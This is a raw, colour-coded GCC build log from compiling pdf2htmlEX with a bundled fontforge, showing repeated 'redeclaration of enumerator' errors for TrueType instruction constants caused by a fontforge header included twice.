[01m[K/usr/local/include/fontforge/ttfinstrs.h:39:18:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_iup[m[K’
  ttf_isect=0x0f, [01;31m[Kttf_iup[m[K=0x30, ttf_jmpr=0x1c, ttf_jrof=0x79, ttf_jrot=0x78,
                  [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:39:18:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_iup[m[K’ was here
  ttf_isect=0x0f, [01;36m[Kttf_iup[m[K=0x30, ttf_jmpr=0x1c, ttf_jrof=0x79, ttf_jrot=0x78,
                  [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:39:32:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_jmpr[m[K’
  ttf_isect=0x0f, ttf_iup=0x30, [01;31m[Kttf_jmpr[m[K=0x1c, ttf_jrof=0x79, ttf_jrot=0x78,
                                [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:39:32:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_jmpr[m[K’ was here
  ttf_isect=0x0f, ttf_iup=0x30, [01;36m[Kttf_jmpr[m[K=0x1c, ttf_jrof=0x79, ttf_jrot=0x78,
                                [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:39:47:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_jrof[m[K’
  ttf_isect=0x0f, ttf_iup=0x30, ttf_jmpr=0x1c, [01;31m[Kttf_jrof[m[K=0x79, ttf_jrot=0x78,
                                               [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:39:47:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_jrof[m[K’ was here
  ttf_isect=0x0f, ttf_iup=0x30, ttf_jmpr=0x1c, [01;36m[Kttf_jrof[m[K=0x79, ttf_jrot=0x78,
                                               [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:39:62:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_jrot[m[K’
  ttf_isect=0x0f, ttf_iup=0x30, ttf_jmpr=0x1c, ttf_jrof=0x79, [01;31m[Kttf_jrot[m[K=0x78,
                                                              [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:39:62:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_jrot[m[K’ was here
  ttf_isect=0x0f, ttf_iup=0x30, ttf_jmpr=0x1c, ttf_jrof=0x79, [01;36m[Kttf_jrot[m[K=0x78,
                                                              [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:40:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_loopcall[m[K’
  [01;31m[Kttf_loopcall[m[K=0x2a, ttf_lt=0x50, ttf_lteq=0x51, ttf_max=0x8b, ttf_md=0x49,
  [01;31m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:40:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_loopcall[m[K’ was here
  [01;36m[Kttf_loopcall[m[K=0x2a, ttf_lt=0x50, ttf_lteq=0x51, ttf_max=0x8b, ttf_md=0x49,
  [01;36m[K^~~~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:40:21:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_lt[m[K’
  ttf_loopcall=0x2a, [01;31m[Kttf_lt[m[K=0x50, ttf_lteq=0x51, ttf_max=0x8b, ttf_md=0x49,
                     [01;31m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:40:21:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_lt[m[K’ was here
  ttf_loopcall=0x2a, [01;36m[Kttf_lt[m[K=0x50, ttf_lteq=0x51, ttf_max=0x8b, ttf_md=0x49,
                     [01;36m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:40:34:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_lteq[m[K’
  ttf_loopcall=0x2a, ttf_lt=0x50, [01;31m[Kttf_lteq[m[K=0x51, ttf_max=0x8b, ttf_md=0x49,
                                  [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:40:34:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_lteq[m[K’ was here
  ttf_loopcall=0x2a, ttf_lt=0x50, [01;36m[Kttf_lteq[m[K=0x51, ttf_max=0x8b, ttf_md=0x49,
                                  [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:40:49:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_max[m[K’
  ttf_loopcall=0x2a, ttf_lt=0x50, ttf_lteq=0x51, [01;31m[Kttf_max[m[K=0x8b, ttf_md=0x49,
                                                 [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:40:49:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_max[m[K’ was here
  ttf_loopcall=0x2a, ttf_lt=0x50, ttf_lteq=0x51, [01;36m[Kttf_max[m[K=0x8b, ttf_md=0x49,
                                                 [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:40:63:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_md[m[K’
  ttf_loopcall=0x2a, ttf_lt=0x50, ttf_lteq=0x51, ttf_max=0x8b, [01;31m[Kttf_md[m[K=0x49,
                                                               [01;31m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:40:63:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_md[m[K’ was here
  ttf_loopcall=0x2a, ttf_lt=0x50, ttf_lteq=0x51, ttf_max=0x8b, [01;36m[Kttf_md[m[K=0x49,
                                                               [01;36m[K^~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:41:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_mdap[m[K’
  [01;31m[Kttf_mdap[m[K=0x2e, ttf_mdrp=0xc0, ttf_miap=0x3e, ttf_min=0x8c, ttf_mindex=0x26,
  [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:41:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_mdap[m[K’ was here
  [01;36m[Kttf_mdap[m[K=0x2e, ttf_mdrp=0xc0, ttf_miap=0x3e, ttf_min=0x8c, ttf_mindex=0x26,
  [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:41:17:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_mdrp[m[K’
  ttf_mdap=0x2e, [01;31m[Kttf_mdrp[m[K=0xc0, ttf_miap=0x3e, ttf_min=0x8c, ttf_mindex=0x26,
                 [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:41:17:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_mdrp[m[K’ was here
  ttf_mdap=0x2e, [01;36m[Kttf_mdrp[m[K=0xc0, ttf_miap=0x3e, ttf_min=0x8c, ttf_mindex=0x26,
                 [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:41:32:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_miap[m[K’
  ttf_mdap=0x2e, ttf_mdrp=0xc0, [01;31m[Kttf_miap[m[K=0x3e, ttf_min=0x8c, ttf_mindex=0x26,
                                [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:41:32:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_miap[m[K’ was here
  ttf_mdap=0x2e, ttf_mdrp=0xc0, [01;36m[Kttf_miap[m[K=0x3e, ttf_min=0x8c, ttf_mindex=0x26,
                                [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:41:47:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_min[m[K’
  ttf_mdap=0x2e, ttf_mdrp=0xc0, ttf_miap=0x3e, [01;31m[Kttf_min[m[K=0x8c, ttf_mindex=0x26,
                                               [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:41:47:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_min[m[K’ was here
  ttf_mdap=0x2e, ttf_mdrp=0xc0, ttf_miap=0x3e, [01;36m[Kttf_min[m[K=0x8c, ttf_mindex=0x26,
                                               [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:41:61:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_mindex[m[K’
  ttf_mdap=0x2e, ttf_mdrp=0xc0, ttf_miap=0x3e, ttf_min=0x8c, [01;31m[Kttf_mindex[m[K=0x26,
                                                             [01;31m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:41:61:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_mindex[m[K’ was here
  ttf_mdap=0x2e, ttf_mdrp=0xc0, ttf_miap=0x3e, ttf_min=0x8c, [01;36m[Kttf_mindex[m[K=0x26,
                                                             [01;36m[K^~~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:42:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_mirp[m[K’
  [01;31m[Kttf_mirp[m[K=0xe0, ttf_mppem=0x4b, ttf_mps=0x4c, ttf_msirp=0x3a, ttf_mul=0x63,
  [01;31m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:42:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_mirp[m[K’ was here
  [01;36m[Kttf_mirp[m[K=0xe0, ttf_mppem=0x4b, ttf_mps=0x4c, ttf_msirp=0x3a, ttf_mul=0x63,
  [01;36m[K^~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:42:17:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_mppem[m[K’
  ttf_mirp=0xe0, [01;31m[Kttf_mppem[m[K=0x4b, ttf_mps=0x4c, ttf_msirp=0x3a, ttf_mul=0x63,
                 [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:42:17:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_mppem[m[K’ was here
  ttf_mirp=0xe0, [01;36m[Kttf_mppem[m[K=0x4b, ttf_mps=0x4c, ttf_msirp=0x3a, ttf_mul=0x63,
                 [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:42:33:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_mps[m[K’
  ttf_mirp=0xe0, ttf_mppem=0x4b, [01;31m[Kttf_mps[m[K=0x4c, ttf_msirp=0x3a, ttf_mul=0x63,
                                 [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:42:33:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_mps[m[K’ was here
  ttf_mirp=0xe0, ttf_mppem=0x4b, [01;36m[Kttf_mps[m[K=0x4c, ttf_msirp=0x3a, ttf_mul=0x63,
                                 [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:42:47:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_msirp[m[K’
  ttf_mirp=0xe0, ttf_mppem=0x4b, ttf_mps=0x4c, [01;31m[Kttf_msirp[m[K=0x3a, ttf_mul=0x63,
                                               [01;31m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:42:47:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_msirp[m[K’ was here
  ttf_mirp=0xe0, ttf_mppem=0x4b, ttf_mps=0x4c, [01;36m[Kttf_msirp[m[K=0x3a, ttf_mul=0x63,
                                               [01;36m[K^~~~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:42:63:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_mul[m[K’
  ttf_mirp=0xe0, ttf_mppem=0x4b, ttf_mps=0x4c, ttf_msirp=0x3a, [01;31m[Kttf_mul[m[K=0x63,
                                                               [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:42:63:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_mul[m[K’ was here
  ttf_mirp=0xe0, ttf_mppem=0x4b, ttf_mps=0x4c, ttf_msirp=0x3a, [01;36m[Kttf_mul[m[K=0x63,
                                                               [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:43:2:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_neg[m[K’
  [01;31m[Kttf_neg[m[K=0x65, ttf_neq=0x55, ttf_not=0x5c, ttf_nround=0x6c, ttf_odd=0x56,
  [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:43:2:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_neg[m[K’ was here
  [01;36m[Kttf_neg[m[K=0x65, ttf_neq=0x55, ttf_not=0x5c, ttf_nround=0x6c, ttf_odd=0x56,
  [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:43:16:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_neq[m[K’
  ttf_neg=0x65, [01;31m[Kttf_neq[m[K=0x55, ttf_not=0x5c, ttf_nround=0x6c, ttf_odd=0x56,
                [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:43:16:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_neq[m[K’ was here
  ttf_neg=0x65, [01;36m[Kttf_neq[m[K=0x55, ttf_not=0x5c, ttf_nround=0x6c, ttf_odd=0x56,
                [01;36m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/views.h:32:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:7[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:43:30:[m[K [01;31m[Kerror: [m[Kredeclaration of enumerator ‘[01m[Kttf_not[m[K’
  ttf_neg=0x65, ttf_neq=0x55, [01;31m[Kttf_not[m[K=0x5c, ttf_nround=0x6c, ttf_odd=0x56,
                              [01;31m[K^~~~~~~[m[K
In file included from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/fontforge-2.0.20170731/splineutil.h:6:0[m[K,
                 from [01m[K/home/tmp/pdf2htmlEX-0.18.7-poppler-0.81.0/src/util/ffw.c:28[m[K:
[01m[K/usr/local/include/fontforge/ttfinstrs.h:43:30:[m[K [01;36m[Knote: [m[Kprevious definition of ‘[01m[Kttf_not[m[K’ was here
  ttf_neg=0x65, ttf_neq=0x55, [01;36m[Kttf_not[m[K=0x5c, ttf_nround=0x6c, ttf_odd=0x56,
                              [01;36m[K^~~~~~~[m[K
